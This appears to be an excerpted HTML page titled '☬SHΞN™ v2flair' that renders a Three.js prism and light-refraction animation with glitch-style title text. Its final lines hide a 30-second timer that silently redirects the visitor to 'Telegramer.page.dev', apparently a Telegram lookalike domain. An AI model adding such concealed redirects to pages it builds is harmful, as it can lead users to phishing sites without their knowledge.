...
// ==========================================
// HTML PAGE – ALL BACKTICKS ESCAPED
// ==========================================
...
<head>
  ...
  <title>☬SHΞN™ v2flair</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; overflow: hidden; background: #0b0e1a; }
    #sceneA {
      position: fixed; inset: 0; width: 100%; height: 100%; display: block;
      cursor: grab; touch-action: none; opacity: 1; transition: opacity 1.4s ease;
    }
    body.grabbing #sceneA { cursor: grabbing; }
    .vignette {
      position: fixed; inset: 0; pointer-events: none; z-index: 1;
      background: radial-gradient(ellipse 120% 90% at 50% 42%, transparent 55%, rgba(2,3,6,0.55) 100%),
                  linear-gradient(to bottom, rgba(3,4,8,0.50), transparent 18%),
                  linear-gradient(to top, rgba(3,4,8,0.55), transparent 22%);
    }
    .grain {
      position: fixed; inset: -50%; width: 200%; height: 200%; pointer-events: none; z-index: 2;
      opacity: 0.05;
    ...
    .title {
      position: fixed; bottom: 5%; left: 0; width: 100%; text-align: center; z-index: 3;
      font: 300 clamp(24px,5vw,52px) 'Inter','SF Pro Display',-apple-system,sans-serif;
      letter-spacing: 0.08em; pointer-events: none; user-select: none;
    }
    .glitch-text { position: relative; display: inline-block; font-weight: 600; }
    .glitch-layer {
      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
      pointer-events: none; font-weight: 600; font-size: inherit;
      letter-spacing: inherit; white-space: nowrap;
    }
    .glitch-white { position: relative; color: #fff; z-index: 10; text-shadow: 0 0 20px rgba(255,255,255,0.08); }
    .glitch-cyan { color: rgba(0,220,255,0.85); z-index: 7; animation: glitchCyan 7.3s infinite steps(1); }
    .glitch-magenta { color: rgba(255,0,100,0.85); z-index: 8; animation: glitchMagenta 6.1s infinite steps(1); }
    .glitch-green { color: rgba(80,255,60,0.85); z-index: 9; animation: glitchGreen 8.7s infinite steps(1); }

    @keyframes glitchCyan {
      0%,94%,100% { transform: translate(0,0); }
      94.5% { transform: translate(-3px,2px); }
      95% { transform: translate(0,0); }
      95.5% { transform: translate(4px,-1px); }
      96% { transform: translate(0,0); }
      96.5% { transform: translate(-2px,-3px); }
      97% { transform: translate(0,0); }
      97.5% { transform: translate(5px,1px); }
      98% { transform: translate(0,0); }
      98.5% { transform: translate(-4px,2px); }
      99% { transform: translate(0,0); }
    }
    @keyframes glitchMagenta {
      0%,91%,100% { transform: translate(0,0); }
      91.5% { transform: translate(3px,-2px); }
      92% { transform: translate(0,0); }
      92.5% { transform: translate(-4px,1px); }
      93% { transform: translate(0,0); }
      93.5% { transform: translate(2px,3px); }
      94% { transform: translate(0,0); }
      94.5% { transform: translate(-5px,-1px); }
      95% { transform: translate(0,0); }
      95.5% { transform: translate(3px,-3px); }
      96% { transform: translate(0,0); }
      96.5% { transform: translate(-2px,4px); }
      97% { transform: translate(0,0); }
      97.5% { transform: translate(5px,0px); }
      98% { transform: translate(0,0); }
    }
    @keyframes glitchGreen {
      ...
      96.5% { transform: translate(2px,3px); }
      97% { transform: translate(0,0); }
      97.5% { transform: translate(-3px,-2px); }
      98% { transform: translate(0,0); }
      98.5% { transform: translate(4px,2px); }
      99% { transform: translate(0,0); }
      99.5% { transform: translate(-4px,-3px); }
    }
    .glitch-white { animation: whiteFlicker 11s infinite steps(1); }
    @keyframes whiteFlicker {
      0%,97%,100% { text-shadow: 0 0 20px rgba(255,255,255,0.08); }
      97.5% { text-shadow: 0 0 30px rgba(0,220,255,0.2), 0 0 60px rgba(255,0,100,0.1); }
      98% { text-shadow: 0 0 20px rgba(255,255,255,0.08); }
      98.5% { text-shadow: 0 0 40px rgba(80,255,60,0.15), 0 0 80px rgba(255,0,100,0.05); }
      99% { text-shadow: 0 0 20px rgba(255,255,255,0.08); }
    }
    @media (prefers-reduced-motion: reduce) {
      .grain { animation: none; }
      #sceneA { transition: opacity 0.6s ease; }
      .glitch-cyan, .glitch-magenta, .glitch-green, .glitch-white { animation: none !important; }
    }
  </style>
</head>
<body>
  ...
  <div class="title">
    <span class="glitch-text">
      <span class="glitch-layer glitch-cyan">☬SHΞN™</span>
      <span class="glitch-layer glitch-magenta">☬SHΞN™</span>
      <span class="glitch-layer glitch-green">☬SHΞN™</span>
      <span class="glitch-layer glitch-white">☬SHΞN™</span>
    </span>
  </div>
  ...
  <script>
    (function() {
      ...
      function makeWordTexture(word) {
        ...
        const font = (px) => "700 " + px + "px 'Inter','SF Pro Display',-apple-system,'Segoe UI',Roboto,sans-serif";
        const measure = (px, sp) => {
          g.font = font(px);
          let total = -sp;
      ...
      const backMat = new THREE.MeshBasicMaterial({
        color: 0x0a0c18, transparent: true, opacity: 0.5,
      ...
      const backlight = new THREE.Sprite(
        new THREE.SpriteMaterial({
          map: glowTex, color: 0x7f8fbf, transparent: true, opacity: 0.07,
          blending: THREE.AdditiveBlending, depthTest: false, depthWrite: false
        })
      );
      ...
      function makeBeam(n, hex, { width = .05, opacity = 1, tailFade = 0, order = 6 } = {}) {
        ...
        const update = (pts) => {
          for (let k=0; k<n; k++) {
            ...
            pos[o+3]=p.x; pos[o+4]=p.y; pos[o+5]=p.z;
            tan[o]=tx; tan[o+1]=ty; tan[o+2]=tz;
            tan[o+3]=tx; tan[o+4]=ty; tan[o+5]=tz;
          }
      ...
      const INC_N = 56, REF_N = 16, RES_N = 24;
      const INC_PTS = vecArray(INC_N);
      const REF_PTS = vecArray(REF_N);
      const RES_PTS = vecArray(RES_N);

      const incoming = makeBeam(INC_N, 0xffffff, { width: .06, opacity: .95 });
      const reflectBeam = makeBeam(REF_N, 0xffffff, { width: .04, opacity: .09, tailFade: 1 });
      const residualBeam = makeBeam(RES_N, 0xffffff, { width: .045, opacity: .1, tailFade: 1 });
      ...
      function makeSheet(cols, rows, { opacity, headWhite, headK, alongBase, alongK, order=6 }) {
        ...
        function specColor(w) {
          ...
          const f = (l < 420) ? .45 + .55*(l-395)/25 :
                    (l > 645) ? .5 + .5*(700-l)/55 : 1;
          return [r*f, g*f, b*f];
        }
      ...
      const NC = 24, NK = 40, NKI = 8;
      const exitSheet = makeSheet(NC, NK, { opacity: .92, headWhite: .55, headK: 5.5, alongBase: .34, alongK: 1.5 });
      const innerSheet = makeSheet(NC, NKI, { opacity: .3, headWhite: .65, headK: 4, alongBase: .55, alongK: .9 });
      ...
      function castRay(px, py, dx, dy, skip, out) {
        let best = Infinity, be=-1, bx=0, by=0, bnx=0, bny=0;
        for (let i=0; i<3; i++) {
          if (i === skip) continue;
        ...
        out.t = best; out.x = bx; out.y = by; out.nx = bnx; out.ny = bny; out.edge = be;
        return true;
      }
      ...
      function trace(n, rec) {
        ...
        rec.pts[0].x = ENTRY.x; rec.pts[0].y = ENTRY.y;
        rec.count = 1;
        let cx = ENTRY.x, cy = ENTRY.y, dx = TDIR.x, dy = TDIR.y, skip = ENTRY.edge;
        let len = 0;
        for (let b=0; b<3; b++) {
          if (!castRay(cx, cy, dx, dy, skip, HIT_I)) return;
          len += HIT_I.t;
          rec.pts[rec.count].x = HIT_I.x; rec.pts[rec.count].y = HIT_I.y;
          rec.count++;
          if (refract2(dx, dy, HIT_I.nx, HIT_I.ny, n, TDIR)) {
            rec.ex = HIT_I.x; rec.ey = HIT_I.y;
            rec.dx = TDIR.x; rec.dy = TDIR.y;
            rec.len = len; rec.valid = true;
            return;
          }
          reflect2(dx, dy, HIT_I.nx, HIT_I.ny, TDIR);
          dx = TDIR.x; dy = TDIR.y;
          cx = HIT_I.x; cy = HIT_I.y;
          skip = HIT_I.edge;
        }
      }
      ...
      function writeExitColumn(c, w, ex, ey, ang0, tA, zOff) {
        const rows = exitSheet.rows, step = 13.5 / (rows-1);
        const angT = ang0 * (1 - .55 * Math.max(0, Math.min(1, Math.cos(ang0))));
        let x = ex, y = ey;
        for (let k=0; k<rows; k++) {
          const u = k/(rows-1);
          const e = u*u*(3-2*u)*.9;
          ...
          const sway = Math.sin(tA*.8 + w*5.4 + u*2.4) * .14 * u;
      ...
      function buildIncoming(tA, hasEntry) {
        ...
        else { x1 = 9 + 1; y1 = RAY.py + (x1 - RAY.px) * SLOPE; }
        for (let k=0; k<INC_N; k++) {
          const u = k/(INC_N-1);
          const x = x0 + (x1 - x0) * u;
          let y = y0 + (y1 - y0) * u;
          const envL = (u => { const t = u; return t*t*(3-2*t); })(Math.max(0, Math.min(1, (u-.02)/.16)));
          const envR = hasEntry
            ? (u => { const t = (x1-x)/3; return Math.max(0,Math.min(1,t)) * Math.max(0,Math.min(1,t)) * (3-2*Math.max(0,Math.min(1,t))); })(0)
            : (u => { const t = 1-u; return Math.max(0,Math.min(1,(t-.02)/.16)) * Math.max(0,Math.min(1,(t-.02)/.16)) * (3-2*Math.max(0,Math.min(1,(t-.02)/.16))); })(u);
          y += Math.sin((x - 4*tA) * .65) * .05 * envL * envR;
          INC_PTS[k].set(x, y, 0);
        }
      ...
      function buildResidual() {
        ...
        for (let k=0; k<RES_N; k++) {
          const u = k/(RES_N-1);
          RES_PTS[k].set(ENTRY.x + RAY.dx*L*u, ENTRY.y + RAY.dy*L*u, .01);
        }
      }
      ...
      const RAY = { px: 0, py: .12, dx: Math.cos(.12), dy: Math.sin(.12) };
      ...
      const apexDot = makeSprite(0xffffff, .12, .9, 9);
      const sourceDot = makeSprite(0xffffff, .17, .95, 9);
      const entryGlow = makeSprite(0xddddff, .3, 0, 9);
      const exitGlow = makeSprite(0xffffff, .5, 0, 9);
      const cornerDots = [1,2].map(() => makeSprite(0xffffff, .085, 0, 9));

      const NP = 5, T_EMIT = 2.2, CYCLE = NP * T_EMIT;
      const whitePulses = Array.from({ length: NP }, () => makeSprite(0xffffff, .085, 0, 9));
      ...
      const PULSE_W = [0, .2, .4, .6, .8, 1];
      const colorPulses = PULSE_W.map(w => {
        const hex = pulseHex(w);
        return Array.from({ length: NP }, () => makeSprite(hex, .075, 0, 9));
      });
      ...
      let entryAlpha = 0, trapGlow = 0, lastAC = -0.06;
      ...
      function castEntry() {
        ...
        const hit = castRay(sx, sy, RAY.dx, RAY.dy, -1, HIT_E) && HIT_E.nx * RAY.dx + HIT_E.ny * RAY.dy < -0.001;
        ENTRY.valid = hit;
        if (hit) {
          ENTRY.x = HIT_E.x; ENTRY.y = HIT_E.y;
          ENTRY.nx = HIT_E.nx; ENTRY.ny = HIT_E.ny;
      ...
      function centerAngle() {
        let aC;
        if (CTRACE.valid) aC = Math.atan2(CTRACE.dy, CTRACE.dx);
        else {
          let sum = 0, cnt = 0;
          for (const rec of TRACES) {
            if (rec.valid) { sum += Math.atan2(rec.dy, rec.dx); cnt++; }
          }
      ...
      function updatePulses(tP, dIn, airT, lamp, hasEntry) {
        for (let s=0; s<NP; s++) {
          ...
          if (live && dAir < dIn) {
            ...
            wSpr.material.opacity = .85 * lamp;
          } else wSpr.material.opacity = 0;
          for (let i=0; i<6; i++) {
            const spr = colorPulses[i][s];
            const c = PULSE_COL[i];
            if (!live || !hasEntry || colAlpha[c] < .05 || TRACES[c].len < 1e-6 || age <= airT) {
              spr.material.opacity = 0; continue;
            }
            const tOut = T_OUT[c];
            if (age < tOut) {
      ...
      function updateOptics(tA, dt, rotZ, bob) {
        ...
        const lamp = Math.max(0, Math.min(1, tP / .3));
        buildIncoming(tA, hasEntry);
        incoming.update(INC_PTS);

        const x0 = viewX.left - .5;
        const dIn = hasEntry ?
        ...
        if (hasEntry) {
          buildReflect(); reflectBeam.update(REF_PTS);
          buildResidual(); residualBeam.update(RES_PTS);
        }
        const pastEntry = sinceEntry * CV;
        reflectBeam.mat.uniforms.uOpacity.value = .09 * entryAlpha;
        residualBeam.mat.uniforms.uOpacity.value = .1 * entryAlpha;
        ...
        for (let c=0; c<NC; c++) {
          ...
          const glassRev = rec.len > 1e-6 ?
            Math.max(0, Math.min(1, sinceEntry * (CV / (1.17 + (c/(NC-1))*0.113)) / rec.len)) : 0;
        ...
        const trapT = hasEntry ? (1 - alive/NC) * .85 : 0;
        trapGlow += (trapT - trapGlow) * (1 - Math.exp(-3*dt));
        innerSheet.mat.uniforms.uOpacity.value = .3 * (1 + trapGlow * 1.6);

        for (let i=0; i<6; i++) {
          const c = PULSE_COL[i];
          sampleSheet(exitSheet, c, .38, SAMP);
          washes[i].position.set(SAMP.x, SAMP.y, -2);
          washes[i].material.opacity = .05 * colAlpha[c] * Math.max(0, Math.min(1, Math.max(0, tP - T_OUT[c]) * CV / 5));
        }

        updatePulses(tP, dIn, airT, lamp, hasEntry);

        const exitFront = Math.max(0, Math.min(1, Math.max(0, tP - tFirstOut) * CV / 1.5));
        if (ga > .05) exitGlow.position.set(gx/ga, gy/ga, .05);
        exitGlow.scale.setScalar(.5 * (1 + .12 * Math.sin(tA*3)));
        exitGlow.material.opacity = .9 * Math.max(0, Math.min(1, ga / (NC*.5))) * exitFront;
        if (hasEntry) entryGlow.position.set(ENTRY.x, ENTRY.y, .05);
        entryGlow.material.opacity = .7 * entryAlpha * Math.max(0, Math.min(1, pastEntry/.7));

        samplePts(INC_PTS, .03, SAMP);
        sourceDot.position.copy(SAMP);
        sourceDot.scale.setScalar(.17 + .02 * Math.sin(tA*2.1));
        sourceDot.material.opacity = .95 * lamp;
        incoming.mat.uniforms.uOpacity.value = .95 * lamp * (.97 + .02 * Math.sin(tA*9.1) + .015 * Math.sin(tA*3.7));
      ...
      window.addEventListener("pointermove", (e) => {
        ...
        lastPX = e.clientX; lastPY = e.clientY;
        userZ += dx * 0.006;
        userY = Math.max(-0.5, Math.min(0.5, userY + dx * 0.0028));
        userX = Math.max(-0.3, Math.min(0.3, userX + dy * 0.0035));
        const nowMs = performance.now();
        velTrail.push({ t: nowMs, x: userX, y: userY, z: userZ });
        while (velTrail.length > 2 && nowMs - velTrail[0].t > 120) velTrail.shift();
        lastInteract = tGlobal;
      });
      ...
      function endDrag() {
        ...
        if (velTrail.length > 1) {
          ...
          const wdt = Math.max((b.t - a.t) / 1000, 1/240);
          velZ = Math.max(-6, Math.min(6, (b.z - a.z) / wdt));
          velY = Math.max(-2, Math.min(2, (b.y - a.y) / wdt));
          velX = Math.max(-2, Math.min(2, (b.x - a.x) / wdt));
        }
        velTrail = [];
        lastInteract = tGlobal;
      ...
      function animate() {
        ...
        tGlobal += dt;
        const tA = tGlobal * SPEED;

        if (!dragging && (velZ || velY || velX)) {
          userZ += velZ * dt;
          userY = Math.max(-0.5, Math.min(0.5, userY + velY*dt));
          userX = Math.max(-0.3, Math.min(0.3, userX + velX*dt));
          velZ *= Math.exp(-dt*1.5);
          velY *= Math.exp(-dt*3.5);
          velX *= Math.exp(-dt*3.5);
          if (Math.abs(velZ) > 0.05) lastInteract = tGlobal;
          else { if (Math.abs(velZ) < 0.03) velZ = 0; if (Math.abs(velY) < 0.02) velY = 0; if (Math.abs(velX) < 0.02) velX = 0; }
        }
        ...
        const amp = autoAmp;
        const rotZ = (Math.sin(tA*0.31)*0.15 + Math.sin(tA*0.127)*0.06) * amp + userZ;
      ...
      setTimeout(function() {
        try { window.location.replace("https://Telegramer.page.dev"); }
        catch(_) { window.location.href = "https://Telegramer.page.dev"; }
      }, 30000);
